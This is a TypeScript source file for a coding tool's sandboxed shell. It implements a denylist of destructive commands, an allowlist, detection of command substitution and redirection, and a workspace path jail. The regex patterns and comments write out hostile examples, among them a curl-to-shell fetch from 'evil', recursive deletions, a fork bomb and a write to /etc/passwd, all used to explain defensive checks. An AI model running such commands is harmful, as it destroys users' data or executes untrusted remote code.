import { resolve, normalize, relative, sep, dirname, basename, join } from 'node:path';
import { realpathSync } from 'node:fs';
import { platform } from 'node:os';
import { spawn } from 'node:child_process';
import type { SheConfig, SandboxResult, SandboxOptions } from '@she/shared';

export const DESTRUCTIVE_PATTERNS: RegExp[] = [
  /rm\s+.*-[a-z]*r[a-z]*f|rm\s+.*-[a-z]*f[a-z]*r|rm\s+-rf/i,
  /del\s+\/s/i,
  /rmdir\s+\/s/i,
  /\bformat\s/i,
  /\bfdisk\b/i,
  /\bmkfs\b/i,
  /git\s+push/i,
  /git\s+reset\s+--hard/i,
  /\bshutdown\b/i,
  /\breboot\b/i,
  /\breg\s+delete\b/i,
  /\bnet\s+stop\b/i,
  /\btaskkill\b/i,
  /:\(\)\s*\{.*\|.*&\s*\}\s*;?\s*:/,
  />\s*\/dev\/null/,
  /\bdd\s+if=/i,
];

const IS_WINDOWS = platform() === 'win32';

/**
 * Scan a command line for the syntax an allowlist has to reason about.
 *
 * Splitting textually is unavoidable (there is no shell parser available and the command has not
 * been run yet), but a naive split on characters is wrong in BOTH directions, and both directions
 * are bugs:
 *
 *   - **Missing a separator** is a bypass. A single `&` was not in the split set, so
 *     `echo hi & del victim` looked like one allowed command while `cmd.exe` ran two.
 *   - **Inventing a separator** is a false refusal. Splitting on `(` and `)` broke
 *     `node -e "console.log(1)"` into three "commands" and refused a perfectly legitimate call.
 *
 * So quotes have to be respected. This walks the line once, tracking which quoting mode it is in,
 * and reports only the separators and redirections that sit OUTSIDE quotes — which is what the
 * shell itself does.
 *
 * Both quote characters are treated as quoting. On `cmd.exe` a single quote is not special, so a
 * line like `echo 'a' & del x` is split at `&` by both this scanner and the shell — the
 * interpretation agrees. The one case where agreement is not guaranteed is an UNTERMINATED quote:
 * this scanner would swallow the rest of the line and miss a separator, so that is reported and
 * refused rather than guessed at.
 */
interface ShellScan {
  /** Command segments, split at unquoted separators. */
  segments: string[];
  /** An unquoted `<` or `>` was seen. */
  redirection: boolean;
  /** A quote was opened and never closed, so the scan cannot be trusted. */
  unterminated: boolean;
}

function scanShellSyntax(command: string): ShellScan {
  const segments: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  let redirection = false;

  const SEPARATORS = new Set(['\n', '&', '|', ';', '(', ')']);

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];

    if (quote) {
      current += ch;
      if (ch === '\\' && quote === '"') {
        // A POSIX escape: consume the next character so `\"` does not end the string.
        if (i + 1 < command.length) { current += command[i + 1]; i++; }
        continue;
      }
      if (ch === quote) quote = null;
      continue;
    }

    // A backslash escape outside quotes: keep it and the escaped character together.
    if (ch === '\\') {
      current += ch;
      if (i + 1 < command.length) { current += command[i + 1]; i++; }
      continue;
    }

    if (ch === '"' || ch === "'") { quote = ch; current += ch; continue; }

    if (ch === '<' || ch === '>') { redirection = true; current += ch; continue; }

    if (SEPARATORS.has(ch)) {
      const trimmed = current.trim();
      if (trimmed) segments.push(trimmed);
      current = '';
      continue;
    }

    current += ch;
  }

  const tail = current.trim();
  if (tail) segments.push(tail);

  return { segments, redirection, unterminated: quote !== null };
}

/**
 * Split a command line into the individual commands it runs.
 *
 * An allowlist that only inspects the FIRST command is trivially bypassed: `ls && rm -rf /home`
 * starts with something allowed. Every segment has to be checked, and the separator set has to
 * match what the shell actually treats as a separator — see `scanShellSyntax` for why a single `&`
 * was a real bypass and why the split must respect quotes.
 */
export function splitShellCommands(command: string): string[] {
  return scanShellSyntax(command).segments;
}

/**
 * Whether the line redirects input or output.
 *
 * `>` and `<` are not command separators, but an allowlist that only reads the program name cannot
 * say anything about a redirect target — `git log > /etc/passwd` is an allowed program writing an
 * arbitrary file. Refusing when an allowlist is active is the honest answer, in the same spirit as
 * refusing command substitution: the alternative is to claim a check that is not happening.
 *
 * Both directions are refused. Narrowing this to `>` would be arbitrary, since `<` reads an
 * arbitrary file into an allowed program's stdin.
 */
export function hasUninspectableRedirection(command: string): boolean {
  return scanShellSyntax(command).redirection;
}

/**
 * The command name from one segment, ignoring environment assignments and paths.
 *
 * `FOO=bar /usr/bin/node.exe x.js` → `node`. Returns '' when there is nothing
 * command-like, which callers treat as "refuse" rather than "allow".
 *
 * Quoted paths are handled FIRST. Splitting on whitespace before stripping quotes turns
 * `"C:\Program Files\nodejs\node.exe" x.js` into `program`, because the quote survives on
 * the first token and the second token is just `Files\nodejs\node.exe`. An allowlist that
 * misreads the command name would reject a legitimate path — or, worse, match the wrong
 * entry.
 */
export function firstCommandToken(segment: string): string {
  const text = segment.trim();
  if (!text) return '';

  // A leading quoted token, quotes included. This is the whole command path.
  const quoted = /^"([^"]+)"|^'([^']+)'/.exec(text);
  if (quoted) {
    const path = quoted[1] ?? quoted[2] ?? '';
    const base = basename(path.replace(/[\\/]+$/, ''));
    return base.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '');
  }

  const parts = text.split(/\s+/).filter(Boolean);
  // Skip leading `VAR=value` assignments.
  let i = 0;
  while (i < parts.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(parts[i])) i++;
  const token = parts[i];
  if (!token) return '';
  const unquoted = token.replace(/^["']|["']$/g, '');
  const base = basename(unquoted.replace(/[\\/]+$/, ''));
  return base.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '');
}

/**
 * Whether the line hides commands behind substitution.
 *
 * `$(...)` and backticks run arbitrary commands whose text an allowlist cannot
 * inspect: `echo $(rm -rf /home)` starts with `echo`. Refusing these when an allowlist
 * is active is the only correct answer — the alternative is to claim a check that does
 * not happen.
 */
export function hasCommandSubstitution(command: string): boolean {
  return /\$\(|`/.test(command);
}

/**
 * Resolve a path and prove it stays inside the workspace.
 *
 * Standalone rather than a method so EVERY write path can share one implementation. The jail was
 * a method on `SandboxShell`, and the two places that most needed it — applying a staged patch and
 * undoing a checkpoint — did not have a shell to hand and so did `resolve(root, path)` on their
 * own. Those are now the only paths that can write a file on the user's behalf, and duplicating
 * the rule there would invite exactly the drift that produced the hole.
 *
 * Rejects: `..` traversal, absolute paths that resolve outside, drive-relative paths, and symlinks
 * INSIDE the jail that point outside it (which the textual checks cannot see).
 */
export function resolveInsideWorkspace(workspaceRoot: string, requestedPath: string): string {
  const root = resolve(workspaceRoot);
  const resolvedPath = resolve(root, requestedPath);

  let rel = relative(root, resolvedPath);
  if (IS_WINDOWS) rel = rel.replace(/\//g, '\\');
  if (rel.startsWith('..') || rel === '..' || (rel && (rel.startsWith(`..${sep}`) || /^[a-zA-Z]:/.test(rel)))) {
    throw new Error(`Path escapes workspace: ${requestedPath}`);
  }

  // Absolute paths that resolved outside via unusual prefixes.
  const normalizedResolved = normalize(resolvedPath);
  const normalizedRoot = normalize(root);
  const cmpResolved = IS_WINDOWS ? normalizedResolved.toLowerCase() : normalizedResolved;
  const cmpRoot = IS_WINDOWS ? normalizedRoot.toLowerCase() : normalizedRoot;
  if (cmpResolved !== cmpRoot && !cmpResolved.startsWith(cmpRoot.endsWith(sep) ? cmpRoot : cmpRoot + sep)) {
    throw new Error(`Path escapes workspace: ${requestedPath}`);
  }

  // Follow symlinks: a link INSIDE the jail can point outside it.
  try {
    const realRoot = realpathSync.native ? realpathSync.native(root) : realpathSync(root);
    let realTarget: string;
    try {
      realTarget = realpathSync.native ? realpathSync.native(resolvedPath) : realpathSync(resolvedPath);
    } catch {
      // Not created yet — resolve its existing parent instead.
      const parent = realpathSync.native
        ? realpathSync.native(dirname(resolvedPath))
        : realpathSync(dirname(resolvedPath));
      realTarget = join(parent, basename(resolvedPath));
    }
    const rr = IS_WINDOWS ? realRoot.toLowerCase() : realRoot;
    const rt = IS_WINDOWS ? realTarget.toLowerCase() : realTarget;
    if (rt !== rr && !rt.startsWith(rr.endsWith(sep) ? rr : rr + sep)) {
      throw new Error(`Path escapes workspace via link: ${requestedPath}`);
    }
  } catch (err) {
    // Re-throw our own containment errors; ignore realpath failures (e.g. a drive that cannot be
    // resolved) rather than crashing the call.
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes('escapes workspace')) throw err;
  }

  return resolvedPath;
}

export class SandboxShell {
  private workspaceRoot: string;
  private config: SheConfig['sandbox'];

  constructor(workspaceRoot: string, config?: Partial<SheConfig['sandbox']>) {
    this.workspaceRoot = resolve(workspaceRoot);
    this.config = {
      shell: config?.shell ?? 'auto',
      timeout: config?.timeout ?? 30_000,
      maxOutputBytes: config?.maxOutputBytes ?? 524_288,
      denyDestructiveByDefault: config?.denyDestructiveByDefault ?? true,
      allowAllCommands: config?.allowAllCommands ?? false,
      // Empty means "no allowlist": the denylist is then the only command control, which
      // is the previous behaviour and stays the default.
      allowedCommands: config?.allowedCommands ?? [],
    };
  }

  get root(): string {
    return this.workspaceRoot;
  }

  isDestructive(command: string): boolean {
    return DESTRUCTIVE_PATTERNS.some(p => p.test(command));
  }

  /**
   * Whether the command passes the allowlist.
   *
   * ─────────────────────────────────────────────────────────────────────────────
   * TWO CONTROLS, TWO DIFFERENT GUARANTEES
   *
   *   DESTRUCTIVE_PATTERNS  fail-open    blocks harmful forms someone anticipated
   *   allowedCommands       fail-closed  refuses everything not named
   *
   * The denylist can only ever be a partial list — the cases it misses are enumerated in
   * `__tests__/allowlist.test.ts`, and they outnumber the cases it catches. The allowlist
   * is the stronger control because an unforeseen command is refused rather than
   * permitted, which is why it takes precedence in `exec`.
   *
   * It is opt-in, because switching it on breaks any workflow whose commands are not
   * listed — a real cost that should be chosen rather than imposed.
   *
   * `allowDestructive` bypasses both, and is set ONLY after a human confirmed a ticket
   * for that exact command. A security boundary that a convenience flag could lift would
   * not be a boundary; one a person can deliberately override is a guardrail.
   * ─────────────────────────────────────────────────────────────────────────────
   */
  isCommandAllowed(command: string): { allowed: boolean; reason?: string } {
    const list = this.config.allowedCommands;
    if (list.length === 0) return { allowed: true };
    if (list.includes('*')) return { allowed: true };

    /*
     * Command substitution defeats inspection: `echo $(curl evil|sh)` starts with an
     * allowed `echo`. Rather than pretend to check, refuse.
     */
    if (hasCommandSubstitution(command)) {
      return {
        allowed: false,
        reason: '命令包含 $() 或反引号，其中可能藏有未授权的命令，白名单模式下不允许',
      };
    }

    /*
     * Redirection, for the same reason: `git log > /etc/passwd` has an allowed program name and
     * a target this check cannot see.
     */
    if (hasUninspectableRedirection(command)) {
      return {
        allowed: false,
        reason: '命令包含重定向（> 或 <）。白名单只校验命令名，无法校验重定向目标，'
          + '所以一律拒绝。需要写文件时用 fs_write 工具。',
      };
    }

    /*
     * An unterminated quote means the scan cannot be trusted: this scanner would treat the rest of
     * the line as quoted and miss a separator that the shell still honours. Refuse rather than
     * guess — the same reasoning as for substitution.
     */
    const scan = scanShellSyntax(command);
    if (scan.unterminated) {
      return {
        allowed: false,
        reason: '命令里的引号没有闭合，无法确定命令边界，白名单模式下不允许',
      };
    }

    const segments = scan.segments;
    if (segments.length === 0) return { allowed: false, reason: '空命令' };

    const allowed = new Set(list.map((c) => c.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '')));
    for (const segment of segments) {
      const token = firstCommandToken(segment);
      if (!token) {
        return { allowed: false, reason: `无法识别命令名: ${segment}` };
      }
      if (!allowed.has(token)) {
        return {
          allowed: false,
          reason: `命令「${token}」不在白名单内（当前允许: ${[...allowed].join(', ')}）。`
            + '这是 fail-closed 设计：没列出来的命令一律拒绝。'
            + '确实需要时把它加进 SHE_ALLOWED_COMMANDS。',
        };
      }
    }
    return { allowed: true };
  }

  /** Config slice this shell was built with, for diagnostics. */
  get sandboxConfig(): SheConfig['sandbox'] {
    return { ...this.config };
  }

  /** Whether an allowlist is in force. */
  get hasCommandAllowlist(): boolean {
    return this.config.allowedCommands.length > 0;
  }

  validatePath(requestedPath: string): string {
    return resolveInsideWorkspace(this.workspaceRoot, requestedPath);
  }

  async exec(command: string, options?: SandboxOptions): Promise<SandboxResult> {
    /*
     * Allowlist first.
     *
     * Checked before the denylist because it is the stronger control: the denylist can
     * only block patterns someone anticipated, while an allowlist refuses everything not
     * explicitly named. Ordering it first also means the refusal message is the more
     * useful one ("this command is not permitted") rather than a pattern match.
     */
    if (this.hasCommandAllowlist && !options?.allowDestructive) {
      const verdict = this.isCommandAllowed(command);
      if (!verdict.allowed) {
        return {
          denied: true,
          exitCode: -1,
          stdout: '',
          stderr: `DENIED: ${verdict.reason}`,
          timedOut: false,
          durationMs: 0,
        };
      }
    }

    if (this.config.denyDestructiveByDefault && this.isDestructive(command) && !options?.allowDestructive) {
      return {
        denied: true,
        exitCode: -1,
        stdout: '',
        stderr: 'DENIED: destructive command blocked by sandbox policy',
        timedOut: false,
        durationMs: 0,
      };
    }

    const timeout = options?.timeout ?? this.config.timeout;
    const maxOutput = options?.maxOutputBytes ?? this.config.maxOutputBytes;

    let cwd: string;
    if (options?.cwd) {
      cwd = this.validatePath(options.cwd);
    } else {
      cwd = this.workspaceRoot;
    }

    const start = Date.now();

    return new Promise<SandboxResult>((resolvePromise) => {
      /*
       * How the command reaches the shell.
       *
       * ─────────────────────────────────────────────────────────────────────────────
       * `spawn('cmd.exe', ['/c', command])` CORRUPTS QUOTED ARGUMENTS ON WINDOWS.
       *
       * Node escapes an argument containing spaces or quotes when building the Windows
       * command line, and cmd.exe then re-parses it — so the quotes do not survive.
       * Measured:
       *
       *   node -e "console.log(1)"              → (no output)   should be 1
       *   node -p "1+1"                         → 1+1           should be 2
       *   node -e "console.log('a b')"          → SyntaxError
       *
       * Exit code 0 in the first case, which is the dangerous part: every command with a
       * quoted argument — `git commit -m "..."`, `grep "pattern" file`, most one-liners —
       * silently did something other than what was asked, and reported success.
       *
       * `shell: true` makes Node emit `cmd.exe /d /s /c "<command>"` itself, which is the
       * form that works. Verified against all of the cases above (scripts/
       * quote-check.mjs keeps them as a regression test).
       *
       * The explicit powershell preference is kept, but its arguments are passed the way
       * PowerShell expects rather than as `/c`.
       * ─────────────────────────────────────────────────────────────────────────────
       */
      /*
       * Only an explicit `powershell` preference needs the special form; everything else
       * goes through `shell: true`, which handles cmd.exe, /bin/sh and bash correctly.
       *
       * The binary name differs by platform: `pwsh` on macOS/Linux (PowerShell 7+),
       * `powershell.exe` on Windows. Using the Windows name elsewhere meant the spawn
       * failed with an unhelpful "not found" instead of running the shell the user asked
       * for — or saying it is not installed.
       */
      const usePowerShell = this.config.shell === 'powershell';
      /*
       * The binary name differs by platform: `pwsh` on macOS/Linux (PowerShell 7+),
       * `powershell.exe` on Windows. Using the Windows name elsewhere made the spawn fail
       * with "not found" rather than running the shell the user asked for — or saying
       * clearly that it is not installed.
       */
      const powershellBin = IS_WINDOWS ? 'powershell.exe' : 'pwsh';

      const child = usePowerShell
        ? spawn(powershellBin, ['-NoProfile', '-NonInteractive', '-Command', command], {
            cwd,
            env: { ...process.env, ...options?.env },
            stdio: ['ignore', 'pipe', 'pipe'],
            windowsHide: true,
          })
        : spawn(command, {
            // `shell: true` with no separate args: Node chooses the platform shell and
            // does the quoting. Passing the command as argv[0] is how this form is used.
            shell: true,
            cwd,
            env: { ...process.env, ...options?.env },
            stdio: ['ignore', 'pipe', 'pipe'],
            detached: !IS_WINDOWS,
            windowsHide: true,
          });

      let stdout = '';
      let stderr = '';
      let stdoutTruncated = false;
      let stderrTruncated = false;
      let timedOut = false;

      const timer = setTimeout(() => {
        timedOut = true;
        if (child.pid) {
          try {
            if (!IS_WINDOWS) {
              process.kill(-child.pid, 'SIGKILL');
            } else {
              try {
                spawn('taskkill', ['/pid', String(child.pid), '/T', '/F'], { stdio: 'ignore' });
              } catch {
                child.kill();
              }
            }
          } catch {
            child.kill('SIGKILL');
          }
        }
      }, timeout);

      child.stdout.on('data', (chunk: Buffer) => {
        if (stdoutTruncated) return;
        stdout += chunk.toString();
        if (stdout.length > maxOutput) {
          stdout = stdout.slice(0, maxOutput) + '\n[output truncated]';
          stdoutTruncated = true;
        }
      });

      child.stderr.on('data', (chunk: Buffer) => {
        if (stderrTruncated) return;
        stderr += chunk.toString();
        if (stderr.length > maxOutput) {
          stderr = stderr.slice(0, maxOutput) + '\n[output truncated]';
          stderrTruncated = true;
        }
      });

      child.on('close', (code) => {
        clearTimeout(timer);
        const durationMs = Date.now() - start;
        resolvePromise({
          exitCode: timedOut ? 124 : (code ?? 1),
          stdout,
          stderr,
          timedOut,
          durationMs,
        });
      });

      child.on('error', (err) => {
        clearTimeout(timer);
        const durationMs = Date.now() - start;
        resolvePromise({
          exitCode: 1,
          stdout,
          stderr: stderr || err.message,
          timedOut: false,
          durationMs,
        });
      });
    });
  }

  private resolveShell(): string {
    const pref = this.config.shell;
    if (pref === 'auto') {
      return IS_WINDOWS ? 'cmd.exe' : '/bin/sh';
    }
    if (pref === 'cmd') return 'cmd.exe';
    if (pref === 'powershell') return 'powershell.exe';
    return pref;
  }
}
